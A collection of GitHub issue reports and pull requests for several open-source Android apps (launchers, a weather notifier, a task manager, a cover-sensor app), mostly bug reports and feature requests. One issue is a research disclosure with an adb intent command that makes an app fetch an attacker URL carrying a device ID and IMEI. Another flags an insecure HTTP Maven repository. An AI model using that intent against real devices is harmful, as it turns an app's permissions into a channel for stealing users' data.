Body: Right now the widget lists the alerts in the same order they are in the feed from the NWS. The alerts don't seem to be in any particular order.  For visibility (since you can usually only see the top 1 or 2) warnings should sort to the top, followed by watches, then everything else.

Title: Incompatible API use in your codes.
Body:
Hi,
We notice that you use com.android.volley as an external library. this library use API like "<org.apache.http.HttpEntity: java.io.InputStream getContent()>", "<org.apache.http.impl.cookie.DateUtils: java.lang.String formatDate(java.util.Date)>" that are already removed after SDK level 23. These API use are very likely to cause crash to your app because the minSDKVersion of your APP is 17.

There are exist reachable path from your code to these api. For example, the reachable path to the first API we mentioned above is:
<de.devmil.muzei.bingimageoftheday.BingImageOfTheDayArtSource: void onTryUpdate(int)>
		--><de.devmil.muzei.bingimageoftheday.cache.BingImageCache: void ensureMissingImages()>
		--><de.devmil.muzei.bingimageoftheday.cache.ImageDownloader: void download(java.util.List)>
		--><de.devmil.muzei.bingimageoftheday.cache.ImageDownloader: void processNextQueueItem()>
		--><de.devmil.muzei.bingimageoftheday.cache.ImageDownloadRequest: void download(android.content.Context,android.net.Uri)>
		--><com.android.volley.toolbox.Volley: com.android.volley.RequestQueue newRequestQueue(android.content.Context)>
		--><com.android.volley.toolbox.Volley: com.android.volley.RequestQueue newRequestQueue(android.content.Context,com.android.volley.toolbox.HttpStack)>
		--><com.android.volley.RequestQueue: void start()>
		--><com.android.volley.NetworkDispatcher: void run()>
		--><com.android.volley.toolbox.BasicNetwork: com.android.volley.NetworkResponse performRequest(com.android.volley.Request)>
		--><com.android.volley.toolbox.BasicNetwork: byte[] entityToBytes(org.apache.http.HttpEntity)>
               --><org.apache.http.HttpEntity: java.io.InputStream getContent()>

We use android studio to analyze your app's apk file, and we also find methods in org.apache.http.HttpEntity don't have definition, they are all referenced methods which need android platform to support.
![selection_002](https://user-images.githubusercontent.com/4310866/38163851-5651002a-352d-11e8-8828-0ee6635776ed.png)


more bugs, please refer to this file below.
[de.devmil.muzei.bingimageofthedayartsource_5.apk.txt](https://github.com/devmil/muzei-bingimageoftheday/files/1865515/de.devmil.muzei.bingimageofthedayartsource_5.apk.txt)


We cannot make 100% sure about the reachable path, so we need your help to check whether it is reachable from your code to these unsupported API. Thanks very much.

best regards,

Dongjie He

Title: Emote Request Thread
Body:
Rules for emotes:

1. The emote must be free to use, i.e. no subscriber only emotes.
2. The emote must be popular across various channels
3. The emote must be a static image
4. The emote must have a reasonably high quality image available

Each comment must request a single emote. Do not club requests, make multiple comments instead.

The following format is recommended:

> Name: FeelsBadMan
> Type: BTTV Global
> Image: [Imgur link](https://i.imgur.com/aSVjtu7.png)

Title: Battery trigger + whitelisted app
Body:
If the phone is below battery trigger and the running app is in the whitelist, the phone will switch between colour and monochrome continuously.
I think it would be better to either force monochrome system-wide from battery threshold (reasonable), have the whitelist overrule battery threshold (counter intuitive to me) or give the user the option through a setting.

Title: Battery trigger + charging
Body: When the phone is charging and the battery is below the set threshold, it's probably reasonable to resume the above-threshold scenario. Other apps behave like this (power saving comes to mind).

Title: Bump compileSdk, update dependencies, fix #18, #19 and #20
Body:
Previously I was using another app ([Notification Memo](https://play.google.com/store/apps/details?id=dk.nicolai.buch.andersen.memo&pli=1)) but it got a lot buggier in Android 13 so I searched for alternatives and found this app on F-Droid as well as another app called [p!n](https://f-droid.org/en/packages/de.nproth.pin/). Of the apps I found I prefer most things in this app but it had some bugs and therefore I made some changes in order to fix those.

- Updated app to work with latest Android Studio
  - Bumped compileSdk and targetSdk
  - Updated dependencies
  - Migrated to `androidx` from `android.support`.
    - [Class Mappings  |  Android Developers](https://developer.android.com/jetpack/androidx/migrate/class-mappings) was helpful.
  - Updated som tests that failed, mostly ParentPin tests that timed out on newer android versions.
  - Manually request permission to send notifications, required in Android 13 (sdk 33).
- Allow more actions when multi-selecting text, such as searching the text online. (From [AndroidManifest.xml in p!n](https://github.com/nproth/pin/blob/aa0a701445107590a2b9dc116330a213c6171983/app/src/main/AndroidManifest.xml#L8-L14))
- Follow the system's night mode setting.
- Fix styling of window background so that selecting text doesn't cause "popups", issue #20. (From [styles.xml in p!n](https://github.com/nproth/pin/blob/aa0a701445107590a2b9dc116330a213c6171983/app/src/main/res/values/styles.xml#L10-L11))
- It seems that a change listener for the "show notifications action" checkbox was never registered, even though most of the code was written. So I registered that listener which should fix #18.
- Make the content view scrollable if it gets too large, should fix #19. 
  - You previously made [a comment](https://github.com/dotWee/MicroPinner/pull/16#issuecomment-341730441) against this in PR #16. Not quite sure if that was only about the case where the dialog was always too large or if it was about the case where the dialog grew too large. Anyway I think a scrollable dialog should be fine [according to the guidelines](https://m3.material.io/components/dialogs/guidelines#de17dbd2-7ecf-459e-af95-0f7132a55e40) as long as the header and footer remain fixed (which they are in my implementation). Even if you disagree it should still be better than just breaking the app which is what happened before.
- I created one notifications channel (category) per visibility level. This should make it easier to configure Android to actually hide the content from the lock screen (at least this is the case on my Samsung phone).
  - I also added a "public version" of the private notification as specified [here](https://developer.android.com/develop/ui/views/notifications/build-notification#lockscreenNotification). (I also used info from [this blog post](https://gabrieltanner.org/blog/android-notifications-overview/)).
    - This allows the notification's title to still be shown on the lock screen while the content is hidden.
- I changed the styling of the spinners so that their drop down's don't overlap with the widget itself. This makes it easier to use the gesture where you drag down on the spinner and then lift your finger at the option you want to select.
- Finally I placed the text inputs vertically. I made this change last so that if you don't like it then its easy to skip.
  - This makes sense because the title is usually not multi line while the content definitively can be. If that happens and the inputs are in different columns (as they were previously) then most of the space in the dialog isn't used which isn't very efficient.

Edit:
I did some additional changes as I found more things to fix:
- Set `android:noHistory` to `true` in order for the app to close when you back out of it. If this isn't done then tapping a notification to edit it after one previously backed out of creating a new pin causes weird behavior. Specifically the app is reopened with the unfinished new pin.
- Changed the name of the app icon to "MicroPinner" from "New Pin". Should fix #29.
- Notifications were only restored after reboots despite the fact that the reboot receiver was invoked from the main activity at [line 74 of `MainDialog.java`](https://github.com/dotWee/MicroPinner/blob/3095ece11dc1ad5bd74a499430d640825e19b322/app/src/main/java/de/dotwee/micropinner/view/MainDialog.java#L74). This is because it failed the first check in the reboot receiver at [line 21 of `OnBootReceiver.java`](https://github.com/dotWee/MicroPinner/blob/3095ece11dc1ad5bd74a499430d640825e19b322/app/src/main/java/de/dotwee/micropinner/receiver/OnBootReceiver.java#L21-L25). I removed that check and added a different check so that the restore code only runs once after the app is started. Force stopping the app or restarting the phone should still cause the notifications to be restored. This fixes #23.

Title: We found 6 flaky tests
Body:
Hello, we are a group of researchers that investigate the occurrence of flaky tests in Android.

We voluntarily ran your GUI tests 12 times and found that some tests pass or fail non-deterministically, which characterizes them as flaky tests [1]. Below we list each flaky test we found, and its number of failures.

* `testPinVisibility` - failed 3 times ([stack trace](https://github.com/dotWee/MicroPinner/files/5532378/testPinVisibility.txt))
* `testDialogTitle` - failed 3 times ([stack trace](https://github.com/dotWee/MicroPinner/files/5532394/testDialogTitle.txt))
* `testDialogButtons` - failed 3 times ([stack trace](https://github.com/dotWee/MicroPinner/files/5532393/testDialogButtons.txt))
* `testPinContent` - failed 1 time ([stack trace](https://github.com/dotWee/MicroPinner/files/5532395/testPinContent.txt))
* `testPinTitle` - failed 4 times [stack trace](https://github.com/dotWee/MicroPinner/files/5532396/testPinTitle.txt)

We ran these tests on a generic Android Emulator (AVD) with Android API version 28.
 
If you confirm this behavior, our suggestion is to add the `@FlakyTest` annotation on these tests. See https://developer.android.com/reference/androidx/test/filters/FlakyTest.

If you wish for a repair proposal, please let us know.

Graciously,
[Denini](https://github.com/denini08), [Leopoldo](https://github.com/leopoldomt) and [Marcelo](https://github.com/damorim).

 
[1] https://hackernoon.com/flaky-tests-a-war-that-never-ends-9aa32fdef359

Title: Replace the default Google Search widget with the Fairphone Clock widget
Body:
Depends on #17 properly working.

Originally suggested in #16: Should we replace the default Google Search widget with the Fairphone Clock widget?

[A poll is active in the Fairphone Community Forum](https://forum.fairphone.com/t/publishing-fairphone-specific-apps-launcher-contact-widget-on-f-droid/28008/71?u=roboe), with three different options:
* Put the Fairphone Clock widget in the main screen and remove the Google Search widget
* Put the Fairphone Clock widget on top, followed by the Google Search below
* Keep just the Google Search widget (users without GApps will see an almost empty screen)

~~So far, 8/8 votes show support for the first option.~~
Update: First option has a 13/14 voters, second one has 1/14.

Title: Default workspace widgets not being inflated
Body:
Inherited from #16.

Since Android 4.1, the `BIND_APPWIDGET` needs explicit permission to load a widget, as stated in the Android docs: https://developer.android.com/guide/topics/appwidgets/host#binding-41 <sup>(which IMHO is a little inconsistent with how permissions are asked from Android 6 onwards, but whatever)</sup>

The default workspace configuration includes widgets from our package (`community.fairphone.fplauncher3`) and from external packages (`community.fairphone.mycontacts`). Neither of them is added by default.

Seems like [Workspace.java](https://github.com/WeAreFairphone/android_packages_apps_FairphoneLauncher3/blob/master/src/com/fairphone/fplauncher3/Workspace.java) handles inflating shortcuts and widgets from XML files.

Title: Use apps from 'recent' to fill the slots
Body:
Hi! I really like this idea of launching an app without going to another screen. 

Usually i just switch between last ~4...8 apps, those apps that are launched often can benefIt the most from a quick launch. 

What if your app would allow to launch apps from recent? This will save time for arranging all the shortcuts. Currently it takes ~10mins to figure out how to add them, then add each app separately, then figure out you might use other selection more often instead.

This could be default or optional(a block of 4...8 slots that are filled from recently launched apps. For example slot1 is empty initially. When i launch googleplay and minimize it, slot1 is filled with googleplay. When after this i open a browser, slot2 is filled with googleplay and slot1 with browser)

LaunchTime is an example of opensource app from fdroid that has this function, a tab(search) with shortcuts that are filled from 'recent' , and it works without root, so i guess it can be done here too(would copying their code be bad?)

Its not a problem, just a addition that might make your already good app even better. To make it from 'instal-setup-use' into 'instal-use'.

Title: Форма иконок
Body:
Все иконки, за исключением взятых из стандартного набора elementary, являются строго круглыми или квадратными. Я думаю, что было бы неплохо внести разнообразие и по возможности стараться рисовать иконки других форм. 

Например, иконки сервисов Яндекса можно делать в форме [пятиугольника](http://images.qwrt.ru/images/2013/11/21/%D0%AF%D0%BD%D0%B4%D0%B5%D0%BA%D1%81-%D0%94%D0%B5%D0%BD%D1%8C%D0%B3%D0%B8-%D0%BB%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF-740167.png), так они будут более узнаваемыми.

Также можно попробовать сделать иконку [домашнего экрана](https://github.com/varlesh/elementary-style/blob/master/icon-source/com_anddoes_launcher.svg) без обрамления в круг/квадрат.

Возможно в некоторых случаях будет уместо немного выйти за рамки квадрата, как например в [оригинальной](http://storage1.static.itmages.ru/i/15/0715/h_1436997293_3133268_33edb81d57.png) иконке просмотрщика шрифтов.

Дополняйте. Надеюсь Kano отнесётся с пониманием.

Ответ «берите в руки Inkscape и вперёд» не принимается :yum:

Title: [enhancement] Support for shortcuts?
Body:
There are several apps which can be used to create shortcuts on the home screen.This is quite useful for e.g. quickly opening a text-file or for starting the "floating calculator" of the default calculator (which is currently not accessible with Silverfish).

Unfortunately, this does not work with Silverfish -- if a shortcut is created, it does not appear anywhere in Silverfish (but only on e.g. the home screen of the Trebuchet launcher). It would be nice if such shortcuts could be created (a) on the home screen and (b) in the app drawer.

Some apps are composed of two apps. For example, when installing **BlitzMail**, then **BlitzNote** is also installed.

In that case Silverfish only displays the BlitzMail app lacking any way of launching **BlitzNote**.

Title: Add setting to disallow direct modification of home screen
Body:
Toggle setting to "freeze" the home screen in its current state.

See issue #24 for discussion.

Title: Allow PIN lock for apps/app drawer
Body: See discussion in issue #24 for reasoning, might be combined with #10 (I believe that's how smartlauncher does it).

Title: Support moving multiple apps into a category
Body:
I have a lot of apps already installed on my phone. I don't mind categorizing them into groups, but the problem is that it is very tedious right now.

A UX I like is how Nova Launcher handles it. If you dig through the menus to edit folders or tabs in Nova, it will present a menu choice to edit the apps contained within the folder/tab. If you touch that option, it will present a modal window with a checklist of all apps installed. (Those apps contained within are already checked.)

Something similar, to be able to mass-assign a lot of apps to a category is one of my personal blockers to using Silverfish as my main launcher.

Title: Add ability to reorder home screen icons
Body: Unless I missed it, there is currently no way to swap icon positions on the home screen. Additionally new icons get added top left, pushing others right. This makes it very tedious to organise the icons and even worse to keep them organised.

Title: Limit tab width
Body:
### Steps to reproduce

Enter a veeeery long tab name 
### What should happen

The name should expand among different lines 
### What actually happens

The tabs stretch the icons a lot and/or hide them totally

Title: Add ability to search/filter by app name?
Body: Sometimes, overall with many apps, a search button comes in handy. Also (maybe), if when you've searched for an app there's exactly _one_ match, it could launch the application automatically.

Title: Add ability to hide some apps from the app drawer
Body: Most launchers don't show themselves in the application drawer (it's kind of pointless). Should Silverfish Launher hide the main activity from the launcher too? Perhaps, in a future, it could show a "Launcher settings" icon instead (with the main application icon and perhaps a settings wheel).

Title: If a lot of apps are placed in the same tab then the tab will take to much time to load
Body: Placing 300 apps in the same tab will make it load for almost 30 seconds before showing the contents of the tab.

Title: Gadgetbridge WeatherSpec v4 support
Body:
Gadgetbridge has introduced two new WeatherSpec version:
- v3, with UV index and rain probability: https://codeberg.org/Freeyourgadget/Gadgetbridge/pulls/3095
- v4 with new current, daily and hourly values: https://codeberg.org/Freeyourgadget/Gadgetbridge/pulls/3273

I am not sure if Weather Notification already has access to this data, or if it is going to be updated, but creating this issue for tracking.

Title: Not parsing the returned data?
Body:
Using ver 0.3.13 (from fdroid) on an old tablet running IceCreamSandwich. Trying to update the forecast gets a popup saying: Weather update failed: null

This seems to be the same no matter what location I enter (which I do manually since the device does not have GPS hardware).

I tried setting the debug thing, it does fetch a plausible XML with what looks like the right contents so not sure what is going on here. 

Edit: Reverting to older version 0.3.10 fixes this, but has issue with using my API key. It does seem to work with the builtin key, though I expect that may fail if there are too many other people making requests with that key at the same time.

I can't try ver 0.3.12 because that needs Lollipop and my device has only IceCreamSandwich.  And ver 0.3.11 for some reason is not on Fdroid, and the device has some issue with not being able to browse Github to get it from here.

Title: Conflict with Gmail's Archive from notification
Body:
**[Original report](https://bitbucket.org/gelin/weather-notification/issue/55) by Denis Nelubin (Bitbucket: [gelin](https://bitbucket.org/gelin), GitHub: [gelin](https://github.com/gelin)).**

----------------------------------------

> I really like this app, but have one request for a change. When I get an email using the gmail app, without your app running I could archive the email by pulling down the notification bar and hitting “archive” in the preview of the email. With your app running, because there is a notification of the weather when pulling down the notification bar, the ability to archive is hidden due to the existence of your notification of the weather.
>
> What I hope you can do: allow us to not have the full weather notification showing when we pull down the notification bar, and therefore, the ability to archive gmail messages will be restored. In other words, I would like the temperature to be displayed in the notification bar, and the more full notification of the weather to not be shown when we pull down the notification bar, so we can again archive gmail messages from the preview. The way it is now we must click on the email, which opens the full gmail app, then click to archive. When I get a useless email, I do not want to have to open the full gmail app to archive the email message. I want to skip that step. Can this be done as an option?

Title: Configurable weather forecasts
Body:
**[Original report](https://bitbucket.org/gelin/weather-notification/issue/31) by Anonymous.**

----------------------------------------

The notification show the current weather condition but I need a weather forecast.

Current meteo condition may be replaced by a near weather forecast, next 3 hours. The number of hour may be configurable and 0 means the actual condition.

The next three days forecast meteo is useful, but when I wake up in the sunrise the question is: will rain today?
Three days forecast may be today and next two days but, after the noon it may become tonight and next two days (or only next three days). Switch time may be configurable.

These two changes can make this application really useful to known weather forecast.

Thank you,
Francesco

Title: insecure maven repository address scheme
Body:
Hi,

One of our CI tests over at F-Droid uncovered that this app is built in an insecure way:

```
Found plain HTTP URL for gradle repository:
build/fr.nicopico.dashclock.birthday/android/build.gradle
repositories {
        mavenCentral()
        maven {
            url 'http://oss.sonatype.org/content/repositories/snapshots/'
        }
gradle build uses plain HTTP URLs for repositories!  This is insecure!
https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/
```

(full log: https://gitlab.com/uniqx/fdroiddata/-/jobs/250140436)

The fix is really easy just use `https` instead of `http`.

cheers.

Title: Inter-application vulnerability
Body:
Hi there,

This issue report is a part of a research. We have found that your application is vulnerable to inter-application communication. It can be replicated as follows:

adb shell 'am start "intent://attacksite.com/post.php?deviceid=123&imei=0123#Intent;scheme=http;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;component=org.mosspaper/.PackageListActivity;end"'

By automating this, an attacking app that does not have INTERNET permission can post sensitive information to the attacker's website.

The problem is in PackageListActivity class where the ACTION of the coming Intent is checked in handleIntents() method and then internet is accessed on the URL in download() method of PackLoaderTask class which effectively lets an attacker to publish sensitive data to a given URL.

A given context is as follows: a malicious app without INTERNET permission but with other permissions (for example reading SMS) can use your application's INTERNET permission to pass sensitive data.

Can you please confirm this?

Thank you,
Biniam

Title: Improve GRADLE build Performance
Body:
[Parallel builds](https://docs.gradle.org/current/userguide/multi_project_configuration_and_execution.html#sec:parallel_execution). This project contains multiple modules. Parallel builds can improve the build speed by executing tasks in parallel. We can enable this feature by setting `org.gradle.parallel=true`.

[Configuration on demand](https://docs.gradle.org/current/userguide/multi_project_configuration_and_execution.html#sec:configuration_on_demand). Configuration on demand tells Gradle to configure modules that only are relevant to the requested tasks instead of configuring all of them. We can enable this feature by setting `org.gradle.configureondemand=true`.

[gradle caching](https://docs.gradle.org/current/userguide/build_cache.html). Shared caches can reduce the number of tasks you need to execute by reusing outputs already generated elsewhere. This can significantly decrease build times. We can enable this feature by setting `org.gradle.caching=true`.

[Gradle daemon](https://docs.gradle.org/current/userguide/gradle_daemon.html#header). The Daemon is a long-lived process that help to avoid the cost of JVM startup for every build. Since Gradle 3.0, Gradle daemon is enabled by default. For an older version, you should enable it by setting `org.gradle.daemon=true`.

=====================
If there are any inappropriate modifications in this PR, please give me a reply and I will change them.

Title: Crash when attempting to add task to just deleted list
Body:
How to reproduce:
1. Create new list
2. Switch to list
3. Delete list
4. Close sidebar so you stay on the just deleted list
5. Press add task floating action button
6. Mirakel crashes

There are several solutions available. To me, the sanest seems to be to not allow the sidebar to be closed after deleting the active list so that the user is forced to choose another list.

This issue is probably low priority, as there is no damage or data loss and the crash can be trivially avoided, but I still felt like reporting it.

Title: Sort option: sort alphabetically
Body:
Please implement a sort option to sort tasks (**especially completed tasks**) alphabetically.
Use case: **Mirakel Shopping List**
A shopping list has _items_ as tasks (e.g. milk, bread, lettuce, etc.) to be ticked off. When a shopping list is being made, previously completed items can be "un-completed" to add them back to the list. It should be quick and easy to find those items. Sorting completed items by creation date or completion date does **not** make it easy to find a single item in a list of ~100 items. Sorting alphabetically by task name **would** make it easy, greatly enhancing Mirakel's flexibility as a _list manager_.
Perhaps the sort by "Alphabetical" option could replace the redundant "Default" option (which appears to be the exact same as "Created date"?)

Title: Overdue meta-list incoherency
Body:
Original Reporter: airelle
Environment: Mirakel 2.8.1 android (F-Droid)
Version: 2.8
Migrated From: https://mirakel.atlassian.net/browse/MIR-600

The "overdue" meta-list is set by default to "not before today -1 days" if you check the meta-list setting, but if you click on the Conditions>Due setting, you can see that the check box actually is "not after" and is checked.

The effect is that by default, all tasks that are due in the future show up as overdue, and conversely all tasks due in the past but not completed are dropped from the overdue meta list.

Furthermore, there is a minor display bug for the selector in the Due setting: when opened, "-1" is displayed as "-10" until you move the wheel.

This affects both the old and new UI.

Title: Mirakel doesn't accept root certificate chains for taskd sync
Body:
Original Reporter: jenserat
Environment: Not Specified
Version: 2.7.*
Migrated From: https://mirakel.atlassian.net/browse/MIR-551

I try to sync Mirakel against a taskd 1.1 setup. I'm not using self-signed certificates, but Class 3 certificates issued by the community certification authority CAcert. They use an immediate certificate in-between:

Root (CAcert Class 1) -> Intermediate (CAcert Class 3) -> taskd certificate, user certificates

When trying to import the configuration file created following the user guide, I receive following error message: "Die Konfigurationsdatei ist fehlerhaft" (translated back to English something like "The configuration file is broken"), it seems that Mirakel doesn't accept certificate chains.

Title: cannot enter numbers at password prompt
Body:
Hello,
I just thought i'd give pi locker a try on this old kitkat 4.4.2 phone.
when i set up pi locker, i decided to use a short (8 chars) password for unlocking, which included numbers.
pi locker accepted this.
when i then tried to unlock my screen i could not enter the numbers of the password, only the letters!
i am using [anysoft keyboard](https://f-droid.org/repository/browse/?fdid=com.menny.android.anysoftkeyboard) and pilocker latest version from f-droid.

it gave me an annoying half hour until i figured out i could uninstall it via adb.

i understand that there isn't much development for pilocker, and if this was a kitkat specific issue i doubt anybody's going to fix (it for) an outdated android version... but just by floating around on f-droid this app can cause much annoyance.

I hope you can adress this issue in some way.

Title: On all devices which support it, please do a graceful shutdown
Body:
On rooted devices which support it, please do a graceful shutdown -- even if your app is not installed as a system app.

On Android 4.3, I see from the [source code](https://android.googlesource.com/platform/frameworks/base/+/jb-mr2-release/cmds/svc/src/com/android/commands/svc/PowerCommand.java#42) that you can do:

`su -c 'svc power shutdown'`

I thank Firelord for his [Stack Exchange answer](http://android.stackexchange.com/questions/43706/whats-the-best-way-to-restart-android-via-command-line-remotely#139139) which inspired me to discover the existence of this shell command.

I think this will do a graceful shutdown, but I'm not sure.  Maybe it will do an abrupt shutdown.  Please test.

Also, the above shell command does not work in Android 4.2.2 or earlier.  The [help text](https://android.googlesource.com/platform/frameworks/base/+/android-4.2.2_r1.2/cmds/svc/src/com/android/commands/svc/PowerCommand.java#35) doesn't mention it, and the code doesn't accept the command.  I've checked.

Title: On devices which support it, please do a graceful reboot
Body:
On devices which support it, please do a graceful reboot.

Using a rooted Samsung Galaxy S Relay 4G running Android 4.1.2, this shell command works for me to successfully cause a graceful reboot:

`su -c 'am start -a android.intent.action.REBOOT'`

I thank Firelord for his [Stack Exchange answer](http://android.stackexchange.com/questions/43706/whats-the-best-way-to-restart-android-via-command-line-remotely#139139) which told me about this shell command.

Your app's Google Play store description says that it supports devices as old as Android 3.0 "Honeycomb".  I haven't tested the above command on any device as old as Honeycomb.  I have no such working device, and no Honeycomb ROMs installed on my emulator.

Dear Pieter:  Do you have a device or ROM handy which is running Honeycomb or older, which you could test with?

Does anyone?

Title: Support OnePlus One
Body: Is it possible to implement the support for oneplus one hall sensor?

Title: Feature Request: The Palm Swipe for Screenshots
Body: Would it be possible for the Palm Swipe for Screenshots Feature to be implemented?

Title: Support for CM12
Body:
hello,

great piece of software,thanks for your work. Today i installed CM12 unstable ROM for my S4 mini.So far so good, but the only major thing i cant get running is Hallmonitor (but maybe im doing something wrong). Do you plan support for lollipop?

thx

Title: Problem to accept or reject calls
Body:
Hello,

First of all, many thanks for your work.
My config : Galaxy S4 I9505 + CM11
I checked the otpion "Phone control".
It works fine, but when the cover is closed, I can not have interaction with the window.
I can not switch ON/OFF the torsh, the camera and I can not accept or reject calls.

Another detail : Before I installed CM11, all worked fine with the native samsung rom.

Excuse me for my poor english.

Thks

Title: Feature request: support for different sized views
Body:
Right now, the app seems to be calibrated specifically for the "Samsung Galaxy S4" as advertised.

This app does work wonderfully with the Note 3, but the opening in the Note 3's s-view is larger than the opening in the S4's s-view, so there's quite a lot of space in the bottom half of the opening when the app activates.

I was hoping a setting to change the view's width, height, and position could be implemented.

Also, if possible, a way to change the position of widgets would be amazing.

Title: 2.0.2 beta
Body:
- 2.0.2 beta
  Major code update:
      - Boost performance
  
  Fixes:
      - Fix possible crash turning on/off torch
      - Fix camera log
      - Fix not all but main security warning in log
      - Fix screen off during alert/activity
  
  Know issues:
      - Alternative layout broken
  
  Next big beta (2.1.0):
      - Gesture/Swipe over the cover (bottom&left to: open camera, hang up call, snooze alarm / bottom right to: toggle torch, pickup call, dismiss alarm / bottom top to: pop-up menu)
      - Pop-up menu like habeIchVergessen propose (using over cover touch): https://github.com/durka/HallMonitor/issues/18
      - Network connectivity indicator (WIFI/2G/3G/4G): https://github.com/durka/HallMonitor/issues/24
      - Add landscape layout to avoid rotate animation & rotate background app
- 2.0.1 beta
  Major code update:
      - Clean/Reorder preferences
      - Clean/Reorder strings
      - Better preferences change/update
      - Better preferences dependencies
  
  Feature:
      - Support 3 modes:
          Lock (require admin)
          OS PowerManagement
          Internal/HallMonitor Powermanagement (require system app)
  
  Fixes:
      - Fix CM 11 LID support
      - Fix widget crash (to confirm)
  
  Know issues:
      - Alternative layout broken
- 2.0.0 beta
  Major code update:
      - Rewrite many code to exclude much as possible from UI thread
      - Add share value between application parts
  
  Feature:
      - Normally support last CM 11 LID action (to test): turn off Use internal service
      - Support 4x1 widget (from my test)
      - Add lock mode option when system app (fixed to lock mode if not system app)
      - New Input Controls menu under Optional Features
      - Pick Up & Hang Up a call without use command line
  
  Fixes:
      - https://github.com/durka/HallMonitor/issues/33 (to test)
      - Fix swipe
  
  Know issues:
      - Alternative layout broken
      - Must force restart application (through Configuration activity) to get widget content updated after the first attachment

Title: SW_LID vs SW_FLIP
Body:
